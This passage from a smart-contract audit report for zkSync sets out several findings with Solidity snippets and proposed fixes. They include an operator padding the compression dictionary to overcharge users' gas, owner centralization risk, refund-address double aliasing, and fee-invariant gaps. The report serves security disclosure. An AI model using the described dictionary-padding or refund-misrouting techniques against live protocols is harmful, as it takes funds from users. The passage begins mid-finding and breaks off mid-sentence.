However, a malicious operator, could artificially extend the dictionary length. They might modify `_rawCompressedData` to be: `0x0004ABCX0000000100020001`. In this scenario, `ABCX` constitutes the `dictionary`, while `encodedData` remains `0x0000000100020001`. This essentially introduces an extra 8-byte `X` to the dictionary, which serves no functional purpose, just increases the dictionary length. The `encodedData` still references the same segments, `0, 1, 2, 1`, without employing the added `X`.

In summary, this manipulation increases the dictionary's length by appending an unnecessary chunk, while not functional, this lengthening of the dictionary results in higher charges for users. Importantly, the dictionary remains valid, as it remains possible to decode the original bytecode from `_rawCompressedData` using the `encodedData`.

### Recommended Mitigation Steps

The function `publishCompressedBytecode` should be revised as follows, where an array named `usedDictionaryIndex` is introduced to monitor the utilization of dictionary chunks. Subsequently, it validates whether all chunks in the dictionary have been utilized.

```solidity
function publishCompressedBytecode(
        bytes calldata _bytecode,
        bytes calldata _rawCompressedData
    ) external payable onlyCallFromBootloader returns (bytes32 bytecodeHash) {
        unchecked {
            (bytes calldata dictionary, bytes calldata encodedData) = _decodeRawBytecode(_rawCompressedData);

            require(dictionary.length % 8 == 0, "Dictionary length should be a multiple of 8");
            require(dictionary.length <= 2 ** 16 * 8, "Dictionary is too big");
            require(
                encodedData.length * 4 == _bytecode.length,
                "Encoded data length should be 4 times shorter than the original bytecode"
            );

            // This code is added
            bool[] memory usedDictionaryIndex = new bool[](
                dictionary.length / 8
            );
            //////////////////////

            for (uint256 encodedDataPointer = 0; encodedDataPointer < encodedData.length; encodedDataPointer += 2) {
                uint256 indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;
                require(indexOfEncodedChunk < dictionary.length, "Encoded chunk index is out of bounds");

                // This code is added
                usedDictionaryIndex[indexOfEncodedChunk] = true;
                //////////////////////

                uint64 encodedChunk = dictionary.readUint64(indexOfEncodedChunk);
                uint64 realChunk = _bytecode.readUint64(encodedDataPointer * 4);

                require(encodedChunk == realChunk, "Encoded chunk does not match the original bytecode");
            }

            // This code is added
            for (uint256 i = 0; i < usedDictionaryIndex.length; ++i) {
                require(
                    usedDictionaryIndex[i],
                    "the dictionary includes chunks that are useless"
                );
            }
            //////////////////////
        }

        bytecodeHash = Utils.hashL2Bytecode(_bytecode);
        L1_MESSENGER_CONTRACT.sendToL1(_rawCompressedData);
        KNOWN_CODE_STORAGE_CONTRACT.markBytecodeAsPublished(bytecodeHash);
    }
```

### Assessed type

Context

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/71#issuecomment-1794747554):**
 > Valid report. This report is about providing useless long compressed data leading to consume user’s gas more (if it consumes much gas, nothing is left for the execution, so it will fail).

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/71#issuecomment-1829778364):**
 > The Warden has shown a way for the Operator to burn excess gas as a strategy to maximize profits, since this directly conflicts with the refund system. Medium seems appropriate.


## [M-23 The `owner` is a single point of failure and a centralization risk](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327#m01-the-owner-is-a-single-point-of-failure-and-a-centralization-risk)

*Submitted by [IllIllI-bot](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327)*

*Note: This finding was reported via the winning [Automated Findings report](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327). It was declared out of scope for the audit, but is being included here for completeness.*

Having a single EOA as the only owner of contracts is a large centralization risk and a single point of failure. A single private key may be taken in a hack, or the sole holder of the key may become unable to retrieve the key when necessary, or the single owner can become malicious and perform a rug-pull. Consider changing to a multi-signature setup, and or having a role-based authorization model.

*There are 24 instances of this issue:*

```solidity
File: cache/solpp-generated-contracts/common/AllowList.sol

51:      function setAccessMode(address _target, AccessMode _accessMode) external onlyOwner {

60:      function setBatchAccessMode(address[] calldata _targets, AccessMode[] calldata _accessModes) external onlyOwner {

85       function setBatchPermissionToCall(
86           address[] calldata _callers,
87           address[] calldata _targets,
88           bytes4[] calldata _functionSigs,
89           bool[] calldata _enables
90:      ) external onlyOwner {

108      function setPermissionToCall(
109          address _caller,
110          address _target,
111          bytes4 _functionSig,
112          bool _enable
113:     ) external onlyOwner {

131:     function setDepositLimit(address _l1Token, bool _depositLimitation, uint256 _depositCap) external onlyOwner {

```
*GitHub*: [51](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L49-L49), [60](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L58-L58), [85](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L83-L88), [108](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L106-L111), [131](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/common/AllowList.sol#L129-L129)

```solidity
File: cache/solpp-generated-contracts/governance/Governance.sol

131:     function scheduleTransparent(Operation calldata _operation, uint256 _delay) external onlyOwner {

144:     function scheduleShadow(bytes32 _id, uint256 _delay) external onlyOwner {

156:     function cancel(bytes32 _id) external onlyOwnerOrSecurityCouncil {

169:     function execute(Operation calldata _operation) external onlyOwnerOrSecurityCouncil {

```
*GitHub*: [131](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L129-L129), [144](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L142-L142), [156](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L154-L154), [169](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/governance/Governance.sol#L167-L167)

```solidity
File: cache/solpp-generated-contracts/zksync/ValidatorTimelock.sol

54:      function setValidator(address _newValidator) external onlyOwner {

61:      function setExecutionDelay(uint32 _executionDelay) external onlyOwner {

```
*GitHub*: [54](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/ValidatorTimelock.sol#L52-L52), [61](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/ValidatorTimelock.sol#L59-L59)

```solidity
File: cache/solpp-generated-contracts/zksync/facets/Admin.sol

22:      function setPendingGovernor(address _newPendingGovernor) external onlyGovernor {

46:      function setPendingAdmin(address _newPendingAdmin) external onlyGovernorOrAdmin {

70:      function setValidator(address _validator, bool _active) external onlyGovernorOrAdmin {

77:      function setPorterAvailability(bool _zkPorterIsAvailable) external onlyGovernor {

85:      function setPriorityTxMaxGasLimit(uint256 _newPriorityTxMaxGasLimit) external onlyGovernor {

100:     function executeUpgrade(Diamond.DiamondCutData calldata _diamondCut) external onlyGovernor {

111:     function freezeDiamond() external onlyGovernor {

122:     function unfreezeDiamond() external onlyGovernorOrAdmin {

```
*GitHub*: [22](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L20-L20), [46](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L44-L44), [70](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L68-L68), [77](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L75-L75), [85](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L83-L83), [100](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L98-L98), [111](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L109-L109), [122](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/contracts/ethereum/contracts/zksync/facets/Admin.sol#L120-L120)

```solidity
File: cache-zk/solpp-generated-contracts/NonceHolder.sol

84:      function setValueUnderNonce(uint256 _key, uint256 _value) public onlySystemCall {

```
*GitHub*: [84](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/NonceHolder.sol#L82-L82)

```solidity
File: cache-zk/solpp-generated-contracts/SystemContext.sol

89:      function setTxOrigin(address _newOrigin) external onlyCallFromBootloader {

95:      function setGasPrice(uint256 _gasPrice) external onlyCallFromBootloader {

314      function setL2Block(
315          uint128 _l2BlockNumber,
316          uint128 _l2BlockTimestamp,
317          bytes32 _expectedPrevL2BlockHash,
318          bool _isFirstInBatch,
319          uint128 _maxVirtualBlocksToCreate
320:     ) external onlyCallFromBootloader {

418      function setNewBatch(
419          bytes32 _prevBatchHash,
420          uint128 _newTimestamp,
421          uint128 _expectedNewNumber,
422          uint256 _baseFee
423:     ) external onlyCallFromBootloader {

```
*GitHub*: [89](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L87-L87), [95](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L93-L93), [314](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L312-L318), [418](https://github.com/code-423n4/2023-10-zksync/blob/c857609bfdc41a0ee2c1b245217a785f66b42a56/code/system-contracts/contracts/SystemContext.sol#L416-L421)

**[Alex the Entreprenerd (judge) commented](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327?permalink_comment_id=4877666#gistcomment-4877666):**
> I believe it is correct to add to the report. Although, post Supreme Court it would not be accepted, and instead would have had to be added to the Analysis.

**[vladbochok (zkSync) disputed and commented](https://gist.github.com/itsmetechjay/57d432101e7d8c98f3a061502aa8f327?permalink_comment_id=4942620#gistcomment-4942620):**
> This is not true, the admin role is not an EOA, but a multisig and is a matter of configuration to the different environments - localhost, testnet and mainnet. So we dispute that this is an issue at all. Moreover, the upgradability is intended training wheels for the current state of L2 protocols.

***

# Low Risk and Non-Critical Issues

For this audit, 19 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-zksync-findings/issues/548) by **erebus** received the top score from the judge.

*The following wardens also submitted reports: [Bauchibred](https://github.com/code-423n4/2023-10-zksync-findings/issues/1124), [ladboy233](https://github.com/code-423n4/2023-10-zksync-findings/issues/984), [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/938), [lsaudit](https://github.com/code-423n4/2023-10-zksync-findings/issues/544), [0xTheC0der](https://github.com/code-423n4/2023-10-zksync-findings/issues/534), [ustas](https://github.com/code-423n4/2023-10-zksync-findings/issues/337), [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/4), [Udsen](https://github.com/code-423n4/2023-10-zksync-findings/issues/1044), [zero-idea](https://github.com/code-423n4/2023-10-zksync-findings/issues/914), [alexfilippov314](https://github.com/code-423n4/2023-10-zksync-findings/issues/896), [hash](https://github.com/code-423n4/2023-10-zksync-findings/issues/819), [Jorgect](https://github.com/code-423n4/2023-10-zksync-findings/issues/664), [oakcobalt](https://github.com/code-423n4/2023-10-zksync-findings/issues/471), [zkrunner](https://github.com/code-423n4/2023-10-zksync-findings/issues/314), [chaduke](https://github.com/code-423n4/2023-10-zksync-findings/issues/144), [evmboi32](https://github.com/code-423n4/2023-10-zksync-findings/issues/135), [wangxx2026](https://github.com/code-423n4/2023-10-zksync-findings/issues/113), and [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/28).*

## [01] Dangerous execution path

In [L1WethBridge, function `deposit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L143C1-L151C50), and [L1ERC20Bridge, function `deposit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L161C1-L169C50), some invariants must hold to apply address aliasing to the refund recipient:

1. `_refundRecipient` on L2 = `_refundRecipient` if it is an EOA in L1.
2. `_refundRecipient` on L2 = `alias(_refundRecipient)` if it is **NOT** an EOA in L1.
3. `_refundRecipient` on L2 = `msg.sender` if it is an EOA in L1 **AND** `_refundRecipient` is `address(0)`.
4. `_refundRecipient` on L2 = `alias(msg.sender)` if it is **NOT** an EOA in L1 **AND** `_refundRecipient` is `address(0)`.

For that, both bridges check 3 and 4 by doing:

```solidity
        address refundRecipient = _refundRecipient;
if (_refundRecipient == address(0)) {
refundRecipient = msg.sender != tx.origin ? AddressAliasHelper.applyL1ToL2Alias(msg.sender) : msg.sender;
}
```

`refundRecipient` is used as an argument to [Mailbox, requestL2Transaction](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236). The issue is that [Mailbox, requestL2Transaction](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236) does apply address aliasing too (checks 1 and 2).

[Mailbox, lines 309 to 314](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L309C1-L314C10)

```solidity
        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.
        address refundRecipient = _refundRecipient == address(0) ? _sender : _refundRecipient;
        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.
        if (refundRecipient.code.length > 0) {
            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);
        }
```

There is an edge case that breaks our four invariants:

`_refundRecipient` on L2 = `alias(alias(msg.sender))` if `msg.sender` is **NOT** an EOA in L1 **AND** `alias(msg.sender)` is **NOT** an EOA in L1 **and** `_refundRecipient` is `address(0)`.

This is bad because the excess of gas may be sent to the wrong `_refundRecipient` or, even worst, if a WETH transfer fails on L2, the whole amount transferred. Although **VERY** unlikely to occur (`2^k` execution steps to find a collision), I would remove this possibility from happening by modifying the code in both bridges:

```diff
         // If the refund recipient is not specified, the refund will be sent to the sender of the transaction.
         // Otherwise, the refund will be sent to the specified address.
         // If the recipient is a contract on L1, the address alias will be applied.
         address refundRecipient = _refundRecipient;
         if (_refundRecipient == address(0)) {
-            refundRecipient = msg.sender != tx.origin ? AddressAliasHelper.applyL1ToL2Alias(msg.sender) : msg.sender;
+            refundRecipient = msg.sender; // it will be aliased by Mailbox if it is a contract and will default to msg.sender if EOA
        }
```

## [02] Code is unreachable

In [Mailbox, function `_verifyDepositLimit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L275C1-L281C6), the code after the `if` statement is never executed as `address(0)` is hard-coded and ETH deposits are uncapped (see the comment):

```solidity
    function _verifyDepositLimit(address _depositor, uint256 _amount) internal {
        IAllowList.Deposit memory limitData = IAllowList(s.allowList).getTokenDepositLimitData(address(0)); // address(0) denotes the ETH
        if (!limitData.depositLimitation) return; // no deposit limitation is placed for ETH

        require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, "d2");
        s.totalDepositedAmountPerUser[_depositor] += _amount;
    }
```

Although, [AllowList, function `setDepositLimit`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/common/AllowList.sol#L129C1-L132C6) does **NOT** enforce it.

```solidity
    function setDepositLimit(
  address _l1Token,
  bool _depositLimitation,
  uint256 _depositCap
) external onlyOwner {
  tokenDeposit[_l1Token].depositLimitation = _depositLimitation;
  tokenDeposit[_l1Token].depositCap = _depositCap;
}
```

Consider changing it to `revert` if trying to cap ETH deposits.

```diff
    function setDepositLimit(
        address _l1Token,
        bool _depositLimitation,
        uint256 _depositCap
    ) external onlyOwner {
+       require(_l1Token != address(0), "ETH deposits cannot be limited");
        tokenDeposit[_l1Token].depositLimitation = _depositLimitation;
        tokenDeposit[_l1Token].depositCap = _depositCap;
    }
```

Also, consider removing the whole `_verifyDepositLimit` function, as it will always return without modifying the state of the contract (tautology).

```diff
-   function _verifyDepositLimit(address _depositor, uint256 _amount) internal {
-       IAllowList.Deposit memory limitData = IAllowList(s.allowList).getTokenDepositLimitData(address(0)); // address(0) denotes the ETH
-       if (!limitData.depositLimitation) return; // no deposit limitation is placed for ETH 

-       require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, "d2");
-       s.totalDepositedAmountPerUser[_depositor] += _amount;
-   }
```

NOTE: `Mailbox` is for ETH, which is uncapped, and tokens are bridged via the bridges, which do check for the deposit limits themselves, so there is no place for that function here.

## [03] Changing addresses sizes from 20 to 32 bytes could break some parts of the system

In [ImmutableSimulator, line 20](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ImmutableSimulator.sol#L20), it says `@notice that address uses uint256 type to leave the option to introduce 32-bytes address space in future` which is a pretty bad idea as:

- It breaks compatibility with the EVM and **MANY** other chains (if not all).
- Your own code casts `address` to `uint160` pretty often. Changing the size of the `address` type may lead to collisions or losing information with addresses whose value is higher than `type(uint160).max`.

## [04] Unused variables (missing logic?)

In [bootloader, lines 2325 to 2326](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L2325C1-L2326C45), the local variables `dataLength` and `data` are not used. I'm putting this as a low as I do not know if there is some missing logic.

In [bootloader, line 1296](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1296), the local variables `innerTxDataOffset` is not used. I'm putting this as a low as I do not know if there is some missing logic.

## [05] Code and comment mismatch

In [ContractDeployer, lines 159](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ContractDeployer.sol#L159C1-L159C71) and [182](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ContractDeployer.sol#L182C1-L182C71) it says `@dev In case of a revert, the zero address should be returned`, but the functions `create2Account` and `createAccount` revert the whole transaction instead. Consider either removing those comments or putting the code in a `try`/`catch` block, so that it returns `address(0)` in the `catch` block.

## [06] `basefee` may be higher than `maxPriorityFeePerGas`

In [bootloader, function `getGasPrice`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1030C1-L1052C14) checks the correctness of the fee parameters, namely:

- maxPriorityFeePerGas > maxFeePerGas \ ? \ revert : proceed
- baseFee > maxFeePerGas \ ? \ revert : proceed

But it does not check that:

- baseFee > maxPriorityFeePerGas \ ? \ revert : proceed

The operator may charge users requesting priority operations more than what they initially allowed:

```diff
            /// @dev Returns the gas price that should be used by the transaction 
            /// based on the EIP1559's maxFeePerGas and maxPriorityFeePerGas.
            /// The following invariants should hold:
            /// maxPriorityFeePerGas <= maxFeePerGas
-           /// baseFee <= maxFeePerGas
+           /// baseFee <= maxPriorityFeePerGas
            /// While we charge baseFee from the users, the method is mostly used as a method for validating 
            /// the correctness of the fee parameters
            function getGasPrice(
                maxFeePerGas,
                maxPriorityFeePerGas
            ) -> ret {
                let baseFee := basefee()

                if gt(maxPriorityFeePerGas, maxFeePerGas) {
                    revertWithReason(
                        MAX_PRIORITY_FEE_PER_GAS_GREATER_THAN_MAX_FEE_PER_GAS(),
                        0
                    )
                }

-               if gt(baseFee, maxFeePerGas) {
+               if gt(baseFee, maxPriorityFeePerGas) {
                    revertWithReason(
-                       BASE_FEE_GREATER_THAN_MAX_FEE_PER_GAS(),
+                       BASE_FEE_GREATER_THAN_MAX_PRIORITY_FEE_PER_GAS(), // add it and remove `BASE_FEE_GREATER_THAN_MAX_FEE_PER_GAS` at line 3384
                        0
                    )
                }

                // We always use `baseFee` to charge the transaction 
                ret := baseFee
            }
```

 so that we have baseFee less than or equal to maxPriorityFeePerGas less than or equal to maxFeePerGas.
 
 Right now, `maxPriorityFeePerGas` is hard-coded to `0`.

```solidity
// Mailbox

    function _serializeL2Transaction(
        WritePriorityOpParams memory _priorityOpParams,
        bytes calldata _calldata,
        bytes[] calldata _factoryDeps
    ) internal pure returns (L2CanonicalTransaction memory transaction) {
        transaction = L2CanonicalTransaction({
        txType: PRIORITY_OPERATION_L2_TX_TYPE,
        from: uint256(uint160(_priorityOpParams.sender)),
        to: uint256(uint160(_priorityOpParams.contractAddressL2)),
        gasLimit: _priorityOpParams.l2GasLimit,
        gasPerPubdataByteLimit: _priorityOpParams.l2GasPricePerPubdata,
        maxFeePerGas: uint256(_priorityOpParams.l2GasPrice),
        maxPriorityFeePerGas: uint256(0),<========================================================= HERE
        paymaster: uint256(0),
        // Note, that the priority operation id is used as "nonce" for `L1->L2` transactions
        nonce: uint256(_priorityOpParams.txId),
        value: _priorityOpParams.l2Value,
        reserved: [_priorityOpParams.valueToMint, uint256(uint160(_priorityOpParams.refundRecipient)), 0, 0],
        data: _calldata,
        signature: new bytes(0),
        factoryDeps: _hashFactoryDeps(_factoryDeps),
        paymasterInput: new bytes(0),
        reservedDynamic: new bytes(0)
    });
```

Noted as low instead of the Medium, but when you update that make sure that the invariants above hold, making the operator unable to charge users more than what they specified.

## [07] `getZkSyncMeta` does not populate fully the `ZkSyncMeta` struct

In [SystemContractHelper, function `getZkSyncMeta`](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L297C1-L303C6) constructs the `ZkSyncMeta` struct from the bytes returned by `getZkSyncMetaBytes()`. However, the fields `heapSize` and `auxHeapSize` are not populated, so they default to `0`. As the only field that is being used in the repo is `gasPerPubdataByte`, I am putting it as a Low.

```diff
    function getZkSyncMeta() internal view returns (ZkSyncMeta memory meta) {
        uint256 metaPacked = getZkSyncMetaBytes();
        meta.gasPerPubdataByte = getGasPerPubdataByteFromMeta(metaPacked);
        meta.shardId = getShardIdFromMeta(metaPacked);
        meta.callerShardId = getCallerShardIdFromMeta(metaPacked);
        meta.codeShardId = getCodeShardIdFromMeta(metaPacked);
+       meta.heapSize = getHeapSizeFromMeta(metaPacked);
+       meta.auxHeapSize = getAuxHeapSizeFromMeta(metaPacked);
    }
```

For reference, the struct is:

```solidity
struct ZkSyncMeta {
    uint32 gasPerPubdataByte;
    uint32 heapSize;
    uint32 auxHeapSize;
    uint8 shardId;
    uint8 callerShardId;
    uint8 codeShardId;
}
```

## [08] The front-end may return a wrong value for the L2 transaction base cost

In [Mailbox, function `l2TransactionBaseCost`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L166C1-L166C36) is not called in the whole project, so it seems it will be called by the front-end to show users an estimation of their transaction cost. However, they do permit to pass an arbitrary `_l2GasPerPubdataByteLimit` whilst function `requestL2Transaction` requires that it is equal to `REQUIRED_L2_GAS_PRICE_PER_PUBDATA`, whose value is `800` (see [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/SystemConfig.json#L18)). I do recommend to hard-code the value in `l2TransactionBaseCost` to **NOT** return misleading estimations to users:

```diff
    function l2TransactionBaseCost(
        uint256 _gasPrice,
-       uint256 _l2GasLimit,
-       uint256 _l2GasPerPubdataByteLimit
+       uint256 _l2GasLimit
    ) public pure returns (uint256) {
-         uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit);
+         uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, REQUIRED_L2_GAS_PRICE_PER_PUBDATA);
          return l2GasPrice * _l2GasLimit;
    }
```

## [09] `rawCall` does permit calls to `MsgValueSimulator` with the `_isSystem` flag set to false (it will revert)
In [MsgValueSimulator, `fallback`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/MsgValueSimulator.sol#L35C45-L35C59) can only be called with the `systemCall` flag set (not the ABI one, which is retrieved through `SystemContractHelper.getExtraAbiData`)

```solidity
    fallback(bytes calldata _data) external onlySystemCall returns (bytes memory)
```

[ISystemContract, lines 15 to 21](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/interfaces/ISystemContract.sol#L15C1-L21C6)

```solidity
    modifier onlySystemCall() {
        require(
            SystemContractHelper.isSystemCall() || SystemContractHelper.isSystemContract(msg.sender),
                "This method require system call flag"
        );
        _;
    }
```

However, in [EfficientCall, function `rawCall`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/EfficientCall.sol#L146) does let the door open for doing calls to `MsgValueSimulator` with the `_isSystem` flag set to `false` even if the corresponding ABI parameter is hard-coded to `true`.

[EfficientCall, lines 139 to 146](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/EfficientCall.sol#L139C1-L146C85)

```solidity
            _loadFarCallABIIntoActivePtr(_gas, _data, false, true); <========= isSystem hard-coded to true

            // If there is provided `msg.value` call the `MsgValueSimulator` to forward ether.
            address msgValueSimulator = MSG_VALUE_SYSTEM_CONTRACT;
            address callAddr = SYSTEM_CALL_BY_REF_CALL_ADDRESS;
            // We need to supply the mask to the MsgValueSimulator to denote
            // that the call should be a system one.
            uint256 forwardMask = _isSystem ? MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT : 0; <========= may be false
```

Consider just using `MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT`, as the `_isSystem` parameter is expected to be used for non-zero value calls.

```diff
    function rawCall(
        uint256 _gas,
        address _address,
        uint256 _value,
        bytes calldata _data,
        bool _isSystem
    ) internal returns (bool success) {
        if (_value == 0) {
            _loadFarCallABIIntoActivePtr(_gas, _data, false, _isSystem);

            address callAddr = RAW_FAR_CALL_BY_REF_CALL_ADDRESS;
            assembly {
                success := call(_address, callAddr, 0, 0, 0xFFFF, 0, 0)
            }
        } else {
            _loadFarCallABIIntoActivePtr(_gas, _data, false, true);

            // If there is provided `msg.value` call the `MsgValueSimulator` to forward ether.
            address msgValueSimulator = MSG_VALUE_SYSTEM_CONTRACT;
            address callAddr = SYSTEM_CALL_BY_REF_CALL_ADDRESS;
-           // We need to supply the mask to the MsgValueSimulator to denote
-           // that the call should be a system one.
-           uint256 forwardMask = _isSystem ? MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT : 0;
+           uint256 forwardMask = MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT; 

            assembly {
                success := call(msgValueSimulator, callAddr, _value, _address, 0xFFFF, forwardMask, 0)
            }
        }
    }
```

As seen in [SystemContractsCaller, lines 103 to 112](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/SystemContractsCaller.sol#L103C1-L112C10), the comments are the same, so it seems it was copy-pasted.

## [10] `L1⇒L2` transactions are not free, but bootloader behaves like they are

In [Mailbox, function `requestL2Transaction`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L270C1-L270C19), the `isFree` parameter of the call to `_requestL2Transaction` is hard-coded to `false`:

```solidity
        canonicalTxHash = _requestL2Transaction(
            sender,                        // from
            _contractL2,                   // to
            _l2Value,                      // bridged ETH
            _calldata,                     // the usual calldata
            _l2GasLimit,                   // the amount of gas user is willing to spend
            _l2GasPerPubdataByteLimit,     // the amount of gas per pubdata the operator may charge
            _factoryDeps,                  // bytecode to be marked as known on L2
            false,                         // isFree
            _refundRecipient               // who is gonna receive the excess of gas or the whole ETH if the tx fails
        );
```

So the calculation of the L2 gas price:

[Mailbox, lines 303 to 307](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L303C1-L307C10)

```solidity
